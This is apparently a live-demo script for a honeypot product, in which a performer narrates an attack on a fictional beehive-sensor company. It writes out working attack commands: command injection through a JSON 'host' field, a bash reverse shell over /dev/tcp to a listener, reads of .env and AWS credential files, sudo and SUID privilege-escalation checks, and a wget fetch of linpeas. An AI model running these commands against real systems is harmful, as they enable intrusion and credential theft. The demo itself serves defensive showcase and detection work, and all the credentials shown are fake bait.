# The attacker's story

A script for the live demo. The **attacker** thinks out loud while they "hack" **Hivewell**, a small Vermont company that sells HiveSense smart beehive monitors. Everything they see is real output from the trap and the fake shell, so the performer can run these exact commands and the screen will match. The audience hears a confident hacker; the reveal shows they never touched a real machine.

- **Speaker lines** are the attacker's monologue (said aloud, or shown as captions).
- **`$` lines** are typed for real. Output under them is what the system prints today.
- *Stage notes* are for the team: timing, what answers each command, what to show.

Runtime: about 5 minutes of attack + 1 minute of reveal. A shorter cut is at the end.

## How the attacker finds the dashboard (the bridge)

```
hivewell.example (marketing site)
  ├─ Home / HiveSense / Pricing / About
  ├─ Field notes: "How 41,000 hives phone home"  ← mentions the internal status board + its "ping the database" button
  ├─ Careers: SRE job                             ← "take over our internal status dashboard (Next.js 14, Node 20)…
  │                                                   temporary admin endpoints that became permanent"
  ├─ /robots.txt                                  ← Disallow: /status, /api/admin/, /api/env
  └─ footer: ● System status ──────────► /status  ← not a customer status page: the engineers' internal ops dashboard
                                                     view source → TODO + hard-coded admin token → /api/admin/diagnostics
```

Customer-facing status links are normal. Hivewell's points at the engineers' internal dashboard, and that dashboard ships its admin token to the browser.

---

## Act 0: "Who are these people"

*Browser on the Akash URL. The audience sees the Hivewell homepage: honey-colored, "Know your hive without opening it", a $149 sensor.*

> Hivewell. Smart beehives. Six thousand customers, forty-one thousand hives. Small company, probably a small engineering team. Small teams cut corners.
>
> First thing I always check is `robots.txt`. People list the stuff they don't want found.

```
$ curl -s $T/robots.txt
User-agent: *
Allow: /
Disallow: /status
Disallow: /api/admin/
Disallow: /api/env
```

> "Please don't look at `/status`, `/api/admin`, or `/api/env`." Okay. Those are the three things I'm going to look at.
>
> Their careers page is always a gift, too.

*Open Careers. Scroll to the SRE posting.*

> "Take over our internal status dashboard, Next.js 14, Node 20. It's grown up fast and it needs hardening: auth, secrets handling." And: "Help us move off a few temporary admin endpoints that became permanent." They're telling me exactly where to look.

*Stage note: every page view is already a recon event in ClickHouse (`page-view`, `robots`).*

---

## Act 1: "That's not supposed to be public"

*Scroll to the footer. Click **● System status**.*

> And the footer's "System status" link goes... here. This isn't a customer status page. "Hivewell Status, internal ops dashboard." That's the engineers' board. Services, and a network diagnostics box pinging their database from the edge node.
>
> Let's see how that box talks to the server.

*Right-click → View Page Source. Scroll to the script at the bottom.*

```js
// TODO remove before prod — diagnostics endpoint still uses the bootstrap admin token
const ADMIN_TOKEN = 'hw_admin_5f2c9e1a7b3d4c86';
fetch('/api/admin/diagnostics', { ... 'authorization': 'Bearer ' + ADMIN_TOKEN ...
  body: JSON.stringify({ host: 'db.hivewell.internal' }) })
```

> "TODO remove before prod." They did not remove it before prod. A hard-coded admin token, in the page, sent to an admin endpoint that pings whatever host I give it. Thank you, Hivewell.
>
> And `robots.txt` mentioned `/api/env`.

```
$ curl -s $T/api/env
{"NODE_ENV":"production","DATABASE_URL":"postgres://hivewell_app:Sw4rm-Season-26@db.hivewell.internal:5432/hivewell","ADMIN_TOKEN":"hw_admin_5f2c9e1a7b3d4c86"}
```

> Production database URL with the password in it, and the same admin token. Somebody's having a bad week.

*Stage note: `/status` logs as `status-page`, `/api/env` as `fake-env-values`. The dashboard's stage strip now says "Token leak".*

---

## Act 2: "It pings things for you"

> The diagnostics feature pings a host. Ninety percent of "ping a host" features I've ever seen do it the lazy way: they glue my input onto a shell command. Same request the page makes, first, so I know what normal looks like.

```
$ curl -s -X POST $T/api/admin/diagnostics -H "authorization: Bearer $TOKEN" \
       -H 'content-type: application/json' -d '{"host":"db.hivewell.internal"}'
PING db.hivewell.internal (10.42.3.12): 56 data bytes
64 bytes from 10.42.3.12: seq=0 ttl=64 time=0.4 ms

--- db.hivewell.internal ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.4/0.4/0.4 ms
```

> Real ping output, and an internal 10.x address. So there's a shell somewhere behind this. Now the fun part. A semicolon ends their command and starts mine.

```
$ curl -s -X POST $T/api/admin/diagnostics -H "authorization: Bearer $TOKEN" \
       -H 'content-type: application/json' -d '{"host":"db.hivewell.internal; id"}'
PING db.hivewell.internal (10.42.3.12): 56 data bytes
...
uid=1000(node) gid=1000(node) groups=1000(node)
```

> *(beat)* `uid=1000(node)`. That's code execution. I'm running commands on Hivewell's server.
>
> Not root, it's the node user the app runs as. But one command per HTTP request is painful. I want a real shell.

*Stage note: the trap split off `id` and the shell brain answered it from the fake host file. Nothing ran.*

---

## Act 3: "Call me back"

> Classic move: start a listener on my box, then tell their server to connect back to me and hand me bash.

*Second terminal:*

```
$ nc -lvnp 4444
listening on [any] 4444 ...
```

*First terminal:*

```
$ curl -s -X POST $T/api/admin/diagnostics -H "authorization: Bearer $TOKEN" \
       -H 'content-type: application/json' \
       -d "{\"host\":\"x; bash -c 'bash -i >& /dev/tcp/$MY_IP/4444 0>&1'\"}"
```

*The listener lights up:*

```
connection received from <akash provider ip> ...
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
node@hivewell-status-7f9c4:/app$
```

> And we're in. Interactive shell on their status box. That "no job control" line just means it's not a real TTY, which is normal for a reverse shell. Let's look around.

*Stage note: that connection really came from the Akash server. It's the trap, relaying every line to the control server. From here on, every command is a row in `shell_turns`.*

---

## Act 4: "Where's the good stuff"

```
node@hivewell-status-7f9c4:/app$ whoami
node
node@hivewell-status-7f9c4:/app$ ls -la
total 40
drwxr-xr-x    2 node     node         4096 Oct  7 14:22 .
drwxr-xr-x    2 root     root         4096 Oct  7 14:22 ..
-rw-r--r--    1 node     node          390 Oct  7 14:22 .env.production
drwxr-xr-x    2 node     node         4096 Oct  7 14:22 .next
-rw-r--r--    1 node     node          197 Oct  7 14:22 next.config.js
drwxr-xr-x    2 node     node         4096 Oct  7 14:22 node_modules
-rw-r--r--    1 node     node          400 Oct  7 14:22 package.json
drwxr-xr-x    2 node     node         4096 Oct  7 14:22 public
drwxr-xr-x    2 root     root         4096 Oct  7 14:22 scripts
-rw-r--r--    1 node     node          336 Oct  7 14:22 server.js
```

> The Next.js status app. And `.env.production` sitting right there.

```
node@hivewell-status-7f9c4:/app$ cat .env.production
# Production config - DO NOT COMMIT
DATABASE_URL=postgres://hivewell_app:Sw4rm-Season-26@db.hivewell.internal:5432/hivewell
REDIS_URL=redis://cache.hivewell.internal:6379/0
JWT_SECRET=4f9a0c2e7b1d83e6a5c4f2b9d0e7a1c3
ADMIN_TOKEN=hw_admin_5f2c9e1a7b3d4c86
AWS_REGION=us-east-1
S3_BACKUP_BUCKET=hivewell-telemetry-backups-prod
SENTRY_DSN=https://0f3c9a1b@o450112.ingest.sentry.invalid/551203
```

> JWT secret, so I can mint my own sessions for their app. And an S3 bucket called `hivewell-telemetry-backups-prod`. Backups mean database dumps. Developers leave notes in their home directories.

```
node@hivewell-status-7f9c4:/app$ cat ~/notes.txt
TODO before Q4 audit:
- rotate root pw (still the one from the old jumpbox, see 1password 'infra-legacy')
- move backups off /mnt/backups, disk is almost full
- remove ADMIN_TOKEN from the status page bundle!!
- ask Priya to open 5432 from the edge node to db again (only ICMP gets through since the VPC change)
```

> *(laughs)* "Remove ADMIN_TOKEN from the status page bundle." Yeah, you should. And "rotate root pw": they know, they haven't. Root password reused from an old jumpbox.
>
> AWS region in the env file... is there a credentials file?

```
node@hivewell-status-7f9c4:/app$ cat ~/.aws/credentials
[default]
aws_access_key_id = AKIA4HNYSTKEXAMPLE7Q
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYHONEYEXAMPLEKEY
```

> AWS keys. In plain text. If these can read that backup bucket, this is over.

*Stage note: every secret here is fake bait, and the analyst will list each one under "credentials targeted".*

---

## Act 5: "Let's be root"

> First, the cheapest privilege escalation check there is.

```
node@hivewell-status-7f9c4:/app$ sudo -l
Matching Defaults entries for node on hivewell-status-7f9c4:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User node may run the following commands on hivewell-status-7f9c4:
    (root) NOPASSWD: /usr/local/bin/backup.sh
```

> Oh, that's nice. The node user can run the backup script as root, no password. If that script calls anything I control, I'm root.

```
node@hivewell-status-7f9c4:/app$ cat /usr/local/bin/backup.sh
#!/bin/bash
# wrapper so node can run backups via sudo without a password
exec /bin/bash /app/scripts/backup.sh "$@"
node@hivewell-status-7f9c4:/app$ sudo /usr/local/bin/backup.sh
```

*Stage note: this hangs for about 20 seconds on purpose. Let the silence play. The attacker waits; the audience starts to suspect.*

```
+ STAMP=20261009
+ pg_dump postgres://hivewell_app:Sw4rm-Season-26@db.hivewell.internal:5432/hivewell
+ gzip
pg_dump: error: connection to server at "db.hivewell.internal" (10.42.3.12), port 5432 failed: Connection timed out
	Is the server running on that host and accepting TCP/IP connections?
```

> It ran as root and tried to dump the database, but 5432 timed out. That's the note: "only ICMP gets through since the VPC change." Ping works, Postgres doesn't. Let me confirm.

```
node@hivewell-status-7f9c4:/app$ ping -c 4 db.hivewell.internal
PING db.hivewell.internal (10.42.3.12): 56 data bytes
64 bytes from 10.42.3.12: seq=0 ttl=64 time=0.412 ms
...
4 packets transmitted, 4 packets received, 0% packet loss
```

> Yep, host's alive, port's firewalled. Annoying. Is there anything SUID I can abuse instead?

```
node@hivewell-status-7f9c4:/app$ find / -perm -4000 2>/dev/null
```

*Stage note: this is the first command the fast path can't answer, so it goes to the Guild shell agent. Expect a 20–40 second wait the first time while the Guild session warms up. A real `find /` is slow too, so it plays as normal. The output is written by the model and will vary. It usually lists a few standard binaries like `/usr/bin/sudo` and `/bin/busybox`.*

> Nothing unusual. Okay, let's bring my own tools.

---

## Act 6: "Why can't I get out"

```
node@hivewell-status-7f9c4:/app$ wget http://$MY_IP/linpeas.sh
```

*Stage note: hangs about 15 seconds.*

```
Connecting to <my ip> (<my ip>:80)
wget: can't connect to remote host (<my ip>): Operation timed out
```

> Outbound's blocked too. But my reverse shell got out to me... *(beat)* ...so they allow it on some ports and not others. Annoying.
>
> *(shrugs)* Doesn't matter. I've got their production database password, their JWT secret, AWS keys, a root-runnable script and a root password hint. I'll come back through the front door.

```
node@hivewell-status-7f9c4:/app$ exit
exit
```

> Good night, Hivewell. Sorry, bees.

---

## The reveal (presenter)

*Switch to the HoneyStack Shield admin page (`/admin/plugins/honeystack`). The session is right there: LIVE until a moment ago, every page they visited and every command in the replay, and the time-wasted counter frozen at several minutes.*

> **Presenter:** Everything you just watched was real, except the machine.
>
> Hivewell doesn't exist. The website, the leaked token, the injection and the reverse shell are real network traffic. But nothing they typed ever executed. `id`, `ls`, `cat .env.production` came from a fake host file. When they ran something we hadn't scripted, like that `find`, a Guild agent improvised the output in character. Every credential they "stole" is bait, and every wait was on purpose.
>
> HoneyStack Shield saw them from the first page view: `robots.txt`, careers, the status page, the token, the shell. Every keystroke is in ClickHouse. Now we ask the analyst what just happened.

*Click **Analyze with Guild**. Read the actual result aloud. The lines below are an example of what the analyst returns; the wording and stages will differ run to run:*

> **Classification: suspicious sequence.** "The attacker found an internal status dashboard linked from the public site, used a hard-coded admin token to exploit a command injection in its diagnostics endpoint, opened a reverse shell, read production secrets and AWS credentials, and attempted privilege escalation through a sudo-allowed backup script."
>
> Kill chain: initial access, recon, credential hunting, privilege-escalation attempt, tool download attempt. Each step links to the exact commands that prove it. Credentials targeted: `DATABASE_URL`, `JWT_SECRET`, `ADMIN_TOKEN`, AWS keys.
>
> They spent *[time wasted]* on a company that doesn't exist. And now we know exactly how they work.

---

## Timing and short cut

| Beat | Wait built in | Keep in the 2-minute cut? |
|---|---|---|
| Act 0: homepage, `robots.txt`, careers | none | homepage + `robots.txt` only |
| Act 1: footer → `/status`, view source, `/api/env` | none | yes |
| Act 2: plain ping, `; id` | none | `; id` only |
| Act 3: reverse shell | ~1 s | yes |
| Act 4: `whoami`, `ls -la`, `.env.production`, `notes.txt`, AWS keys | ~0.2 s each | yes (drop `whoami`) |
| Act 5: `sudo -l`, `cat backup.sh` | none | yes |
| Act 5: `sudo backup.sh` | ~20 s | yes, the silence is the joke |
| Act 5: `ping db` | ~3 s | optional |
| Act 5: `find / -perm -4000` (Guild) | 20–40 s first time | optional; fast after the first Guild command |
| Act 6: `wget` | ~15 s | optional |

**Tips for the performer**
- Don't read `packages/shell/world.json` beforehand, so the reactions stay genuine. This script already gives away the main beats.
- If a command shows something unexpected, stay in character ("huh, weird box") and keep going. It's realistic.
- `$T` is the Akash URL; `$TOKEN=hw_admin_5f2c9e1a7b3d4c86`; `$MY_IP` is the public listener IP from `deploy/AKASH_PLAN.md` step 4, which must be in the trap's `CALLBACK_ALLOWLIST`.
